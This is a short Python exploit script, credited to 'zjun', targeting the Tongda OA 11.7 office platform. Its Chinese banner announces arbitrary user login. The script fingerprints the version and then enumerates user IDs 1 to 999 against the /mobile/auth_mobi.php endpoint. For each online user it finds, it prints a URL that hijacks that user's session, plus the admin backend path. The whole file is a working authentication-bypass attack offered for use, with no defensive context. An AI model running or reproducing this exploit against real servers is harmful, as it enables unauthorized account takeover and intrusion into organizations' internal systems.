import requests
import sys
import re
import time

RED = '\x1b[1;91m'
BLUE = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
}


def title():
    print(BOLD + '''
        TongdaOA任意用户登录      
        版本: 通达OA 11.7                  by:zjun
        Url: http://ip:port         https://www.zjun.info
        Use: python3 TongdaOA.py
    ''' + ENDC)


def Target_Info(target_url):
    print(BOLD + '\n[+]正在获取版本信息\n' + ENDC)
    url = target_url + '/inc/expired.php'
    try:
        response = requests.get(url=url, headers=headers)
        pattern = re.compile('<td class="Big"><span class="big3">(.*?)</span>', re.S)
        info = re.findall(pattern, response.text)
        print(GREEN + info[0].replace('<br>', '').replace(' ', '').replace('	', '').strip() + '\n' + ENDC)
    except:
        print(RED + '未发现版本信息\n' + ENDC)


def Target_URL(target_url, uid):
    url = target_url + '/mobile/auth_mobi.php?isAvatar=1&uid=%d&P_VER=0' % (uid)
    manage = target_url + "/general/"
    print(BOLD + '[+]正在遍历UID=%d' % (uid) + ENDC)
    try:
        response = requests.get(url=url, headers=headers)
        if "RELOGIN" in response.text and response.status_code == 200:
            print(RED + '目标用户为离线状态\n' + ENDC)
        elif response.status_code == 200 and response.text == "":
            print(GREEN + '目标用户在线,请先访问: \n' + url + ENDC)
            print(GREEN + '再访问后台: \n' + manage + '\n' + ENDC)
            sys.exit(0)
        else:
            print(RED + '未知错误，目标可能不存在或不存在该漏洞\n' + ENDC)
    except Exception as e:
        print(RED + '请求失败,无法建立有效连接\n' + ENDC)
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input(BOLD + 'Url: ' + ENDC))
    Target_Info(target_url)
    res = input(BOLD + '默认sleep=0, 是否遍历UID? (y/n) :' + ENDC)
    if res == 'y':
        for i in range(1, 1000):
            uid = i
            time.sleep(0)
            Target_URL(target_url, uid)
    elif res == 'n':
        print(BOLD + '[+]exit\n' + ENDC)
        sys.exit(0)
    else:
        print(RED + '\n未输入正确合法选项\n' + ENDC)
